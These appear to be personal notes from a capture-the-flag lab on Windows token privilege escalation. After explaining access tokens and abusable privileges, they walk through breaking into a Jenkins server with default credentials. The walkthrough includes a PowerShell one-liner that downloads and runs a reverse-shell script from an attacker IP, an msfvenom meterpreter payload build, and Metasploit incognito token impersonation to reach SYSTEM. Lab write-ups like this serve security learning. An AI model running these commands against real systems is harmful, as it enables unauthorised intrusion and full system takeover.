NOTES
------------------
Windows LSASS priv esc
Windows has account tokens, usually assigned by LSASS.exe
consist of:
	user SIDs - secure identifier
	group SIDs
	privileges
	among others

two types of tokens
	primary access tokens - associated with a user account athat are generated on log on
	impersonation tokens - allow a particular procces (or thread) to gain acces to resources useing the token of aanother user or client
		different levels
			SecurityAnonymous: current user/client cannot impersonate another user/client
    	SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
    	SecurityImpersonation: current user/client can impersonate the client's security context on the local system
    	SecurityDelegation: current user/client can impersonate the client's security context on a remote system

			Most commonly abused privs
				SeImpersonatePrivilege
				SeAssignPrimaryPrivilege
				SeTcbPrivilege
				SeBackupPrivilege
				SeRestorePrivilege
				SeCreateTokenPrivilege
				SeLoadDriverPrivilege
				SeTakeOwnershipPrivilege
				SeDebugPrivilege

PROCESS
-----------------

Jenkins server on port 8080
	admin:admin login

Power shell command to get a shell:
powershell iex (New-Object Net.WebClient).DownloadString('http://10.13.31.29:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.13.31.29 -Port 4444

can execute shell commands in the jenkins console -> execute the above command to get a reverse connection
	easily get the flag in the desktop of bruce

UPGRADING SHELL ON WINDOWS
	with a reverse connection create a new .exe rev shell with msf
		msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.31.29 LPORT=9001 -f exe -o shell.exe

	Get the msf shell onto the victim
		powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.31.29:8080/shell.exe','shell.exe')"

	On attacker:
		load metasploit multi/exploit/handler
		set options and run the handler
		execute the shell on the reverse conn

	Priv esc
		whoami /priv lists the privileges
			see that we have two interesting tokens
		load the incognito module of metasploit
			will allow exploitation of the module
		list_tokens -g to see all the tokens we have access to
		BUILTIN\Administrators is sitting there
			impersonate_token "BUILTIN\Administrators" to get system token
		with system token, migrate to a process with system privs (services.exe)
			migrate PID

	root flag is in system32\config
